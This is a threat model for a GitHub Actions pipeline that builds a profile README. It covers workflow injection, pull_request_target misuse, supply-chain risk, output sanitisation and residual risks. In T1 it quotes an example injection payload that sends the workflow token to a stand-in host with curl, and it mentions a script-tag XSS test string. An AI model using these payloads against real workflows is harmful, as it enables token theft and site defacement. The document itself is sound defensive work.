# Threat model — profile build pipeline

A GitHub profile README looks like a document. It is not. Behind this one is a
workflow that runs on GitHub's infrastructure, holds a token with write access
to a repository on my account, and processes data fetched from a public API.
That is a program, and it deserves the same treatment as any other program I
would put on the internet.

This document is the honest version: what I am defending, what I am defending
against, what I actually built, and what I chose to accept.

---

## 1. Assets

| Asset | Why it matters |
| --- | --- |
| The repository's `GITHUB_TOKEN` | Write access to `ChristopherMulwa/ChristopherMulwa` during a run. Repository-scoped and expires with the job, but it can rewrite my profile. |
| The published README and assets | The first thing a recruiter, a client, or a collaborator sees. Defacement is a reputational, not a technical, loss — but it is still a loss. |
| The runner | An ephemeral VM with network access. Code execution here is a foothold to abuse the token and to reach anything the runner can reach. |
| My account's standing | A profile page that serves malicious content, even briefly, is a trust problem that outlives the incident. |

## 2. Trust boundaries

```
  untrusted                                       trusted
  ─────────────────────────────────────────────  ─────────────────
  GitHub API responses      ──▶  sanitize.py  ──▶  SVG / Markdown
  profile.json (as data)    ──▶  config.py    ──▶  renderer
  workflow triggers         ──▶  (allow-list) ──▶  job
```

Everything to the left of an arrow is treated as attacker-controlled, even
when it is mine. `profile.json` is committed by me, but the validator does not
grant it trust on that basis — a compromised laptop or a bad merge should not
turn a config file into a rendering primitive.

## 3. Adversaries and what they can do

**A. An attacker with no special access.** Can open issues, pull requests, and
comments on this repository; can control the content of any public GitHub
resource the build reads.

**B. An attacker who compromises an upstream dependency.** The classic
software supply chain attack — a poisoned package or a hijacked Action tag.

**C. An attacker who compromises my account.** Out of scope. If they have my
credentials, the profile README is not the interesting target.

---

## 4. Threats and mitigations

### T1 — Command injection into a workflow `run:` block

**The attack.** The best-known GitHub Actions vulnerability class. A workflow
interpolates `${{ github.event.issue.title }}` (or a comment body, or a branch
name) directly into a shell script. The expression is substituted *before* the
shell parses the line, so an issue titled `"; curl evil.example/$GITHUB_TOKEN #`
becomes a command. Profile-README bots are a common victim because many of
them react to issues or comments.

**Mitigation.** No trigger in this repository carries attacker-controlled
content. `schedule`, `workflow_dispatch`, and `push` to `main` are all
owner-controlled. The two expressions used at all —
`${{ secrets.GITHUB_TOKEN }}` and `${{ github.repository_owner }}` — are
assigned to `env:` and referenced as shell variables, never pasted into a
command line.

**Status.** Mitigated by construction. There is no untrusted string anywhere
near a `run:` block.

### T2 — `pull_request_target` privilege escalation

**The attack.** `pull_request_target` runs in the context of the *base*
repository, with secrets and a write token, while the pull request under test
comes from a fork. Checking out and executing the fork's code — a build script,
a test, a linter config — is remote code execution with the token in scope.

**Mitigation.** `pull_request_target` and `workflow_run` are not used. The
verification workflow uses plain `pull_request`, which for a fork runs with a
read-only token and no secrets.

**Status.** Mitigated.

### T3 — Supply chain: a compromised dependency

**The attack.** A package the generator imports, or an Action the workflow
uses, is compromised upstream. Its code runs inside a job that holds a token.
Pinning an Action by commit SHA helps, but it protects against tag movement,
not against the pinned commit itself being malicious or the action's own
transitive dependencies.

**Mitigation.** The dependency count is zero on both axes:

* **No third-party Python packages.** The generator imports only `json`, `re`,
  `os`, `time`, `math`, `hashlib`, `argparse`, `unicodedata`, `pathlib`,
  `dataclasses`, and `urllib.request`. There is no `requirements.txt` and no
  `pip install` step, so there is nothing to typosquat and no lockfile to
  poison. PyYAML was specifically avoided — `yaml.load` without an explicit
  safe loader constructs arbitrary Python objects, and using JSON removes the
  footgun rather than documenting it.
* **No third-party Actions.** Not even `actions/checkout`. The workflow does
  `git init`, `git fetch --depth 1`, `git checkout` — four lines that replace
  an Action which pulls its own Node dependency tree into a privileged job.

**Status.** Mitigated by elimination. The remaining supply chain is the
GitHub-hosted runner image and CPython, both of which I would have to trust in
any design.

### T4 — Injection through GitHub API data

**The attack.** The generator renders strings it did not author: repository
names, descriptions, language names. Those are free text controlled by whoever
owns the account, and they flow into two sinks. An SVG served from
`raw.githubusercontent.com` is *not* passed through GitHub's HTML sanitiser,
so `<script>` inside an asset is live script in that origin.

**Mitigation.** A single trust boundary in `generator/sanitize.py`, applied
per sink:

* `xml_text` / `xml_attr` — entity-encode `& < >` and quotes for SVG.
* `md_text` — HTML-encode `& < >`, backslash-escape emphasis and code
  metacharacters, neutralise block markers at line start, collapse newlines.
* `md_code` — strip backticks (escapes are literal inside a code span).
* `safe_url` — scheme and host allow-list; reject embedded credentials.
* `slug` — reduce to `[a-z0-9-]` for anything that becomes an identifier.

Every value is also NFC-normalised, stripped of bidirectional and zero-width
control characters, and length-capped before it reaches any of the above.

Verified by `tests/test_sanitize.py`, which pushes eighteen payload families
through both sinks, and by `tests/test_pipeline.py`, which feeds
`</text><script>alert(1)</script>` in as a language name and asserts the
resulting SVG still parses as XML and contains no script element.

**Status.** Mitigated and tested.

### T5 — Secret exfiltration into published output

**The attack.** A rendering bug, a debug statement, or a stray environment
dump writes token material into `README.md` or an asset — permanently, in git
history, on a public repository.

**Mitigation.** `tools/audit_output.py` runs after rendering and before the
commit step. It fails the build if any generated file contains a
credential-shaped string, *or the literal value of any environment variable
whose name looks secret-bearing*. The second check is the important one: it
catches the general case rather than known token formats.

**Status.** Mitigated with a verification gate.

### T6 — Denial of service through the data source

**The attack.** The API hangs, returns a multi-gigabyte body, redirects
somewhere unexpected, or returns absurd values that produce broken geometry.

**Mitigation.** Ten-second timeout, 4 MB response ceiling, at most four pages,
two retries with backoff, and redirects refused outright by a custom handler.
Numeric values from the API are passed through `clamp()` before they reach any
coordinate. On any failure the generator falls back to the committed snapshot
in `data/cache.json` and publishes a page marked "cached" — the build never
fails and the profile never breaks.

**Status.** Mitigated.

### T7 — Egress abuse from the runner

**The attack.** Code in the job reaches a host it has no business reaching, to
exfiltrate or to fetch a second stage.

**Mitigation.** The generator can only construct URLs under
`https://api.github.com/`, checked immediately before the request is issued.
Redirects are refused, so a response cannot move the request off-host.

**Status.** Partially mitigated — see R2 below.

### T8 — Stale or unverifiable published output

**The attack.** Less an attack than a correctness failure: the committed
README drifts from what the generator actually produces, so what is published
cannot be derived from what is in the repository.

**Mitigation.** The build is deterministic. Every timestamp derives from the
snapshot rather than the wall clock, and there is no randomness anywhere in
the renderer. `python3 -m generator --check` re-renders and fails if a single
byte differs; CI runs it on every pull request.

Determinism means *every* rendered byte is a function of the committed
snapshot — including the freshness badge. `data/cache.json` therefore records
how the snapshot was obtained (`live`), and loading it back does not alter
that flag. Only `resolve()` degrades it, on the path where a fetch was
actually attempted and failed, and it writes the degraded flag back so the
published page and the published snapshot always agree.

**Status.** Mitigated.

---

## 5. Residual risk — what I accepted, and why

I would rather write these down than imply they do not exist.

**R1 — The token appears in a process command line.** `git fetch` and
`git push` are invoked with the token inside the remote URL. Any process on
the runner could read it from `/proc`. I accept this because the runner is
single-tenant and destroyed after the job, and because the alternative —
writing the credential into `.git/config` via `http.extraheader` — leaves it
on disk for the rest of the job instead, which I judge to be worse. Actions
masks the token's value in logs, so an error message that echoes the URL does
not leak it.

**R2 — Egress is constrained by the application, not by the network.** The
generator will only talk to `api.github.com`, but nothing at the runner level
enforces that. A network-level egress policy would need a third-party action
(`step-security/harden-runner` is the usual choice), which would reintroduce
exactly the dependency class T3 exists to remove. Given that the job runs only
first-party code with no package installs, I judged the trade the wrong way
round and left it out. If this pipeline ever grows a dependency, that decision
should be revisited.

**R3 — Activity data is incomplete.** The contributions calendar requires a
token with `read:user`, which the automatic `GITHUB_TOKEN` does not carry.
Getting it would mean storing a long-lived personal access token in repository
secrets — a credential with far more reach than this job needs, sitting
permanently in a public repository's settings. I chose accurate-but-partial
data over a standing over-privileged secret: commit activity is reconstructed
from per-repository statistics and therefore under-counts private and
organisation work.

**R4 — The workflow can commit to `main`.** By design. The blast radius is one
repository that contains only generated content, and every change is a signed,
attributable commit in public history.

**R5 — I trust GitHub.** The runner image, the API, and the Actions control
plane are all outside my control. This is unavoidable for anything hosted
here, and is stated so that the boundary is explicit rather than assumed.

---

## 6. Review history

This pipeline was written, then attacked. The second pass found six real
issues that reading the code had not: a code-span escape that let a value out
of its span and into the README as raw HTML, an unencoded quote that could
inject a second `src` into a generated `<img>`, a double-escaped table
delimiter, an output audit that regexed serialised bytes and so both
false-positived on inert text and missed a non-local `url()`, a missing
committed snapshot that made the reproducibility gate fail on every run, and a
`git add` that aborts the publish step under `set -e` when an optional path is
absent.

Each one is now pinned by a test in `tests/test_regressions.py`. The lesson
worth keeping: **parse, do not pattern-match.** Two of the six were the same
mistake in different places — checking a serialised document with a regular
expression instead of parsing it and inspecting the structure. Escaped text in
a text node is inert; only markup can be active, and only a parser can tell
the difference.

A seventh was found while commissioning the pipeline, by running it: `make
live` followed by `make check` failed every time. `load_cache()` forced
`live=False` on the way in, so the freshness badge was the one part of the
document that was not a function of the committed snapshot — a live build
rendered LIVE TELEMETRY and the verification re-render produced CACHED
SNAPSHOT. The gate was unpassable after any live build, and the published tree
was one CI could not verify. The fix is in T8 above.

The lesson here is different from the first six, and worth keeping separately:
**a unit test that pins the wrong invariant protects the bug.** There was a
passing test asserting exactly the broken behaviour
(`test_cache_never_reports_itself_as_live`), written from the reasonable-sounding
premise that "a cached snapshot is by definition not live". It reads as a
safety property. It is really a statement about the *loader*, and it
contradicted the reproducibility property the same suite was supposed to
guarantee. Neither test was wrong in isolation; nothing checked them against
each other. What caught it was executing the documented workflow end to end,
which no test did — so that end-to-end path is now a test too
(`LiveRenderIsReproducible`).

## 7. What would change my mind

Review triggers, not a fixed schedule:

* Any new `uses:` in a workflow — re-evaluate T3 and R2 together.
* Any new trigger type — re-evaluate T1 and T2 before merging.
* Any new data source — it needs its own row in section 4.
* Any new sink (an RSS feed, a JSON export) — it needs its own encoder in
  `sanitize.py`; reusing the wrong one is how these bugs happen.

---

*Last reviewed alongside the code it describes. If this document and the
workflow disagree, the workflow is the truth and this document is a bug.*
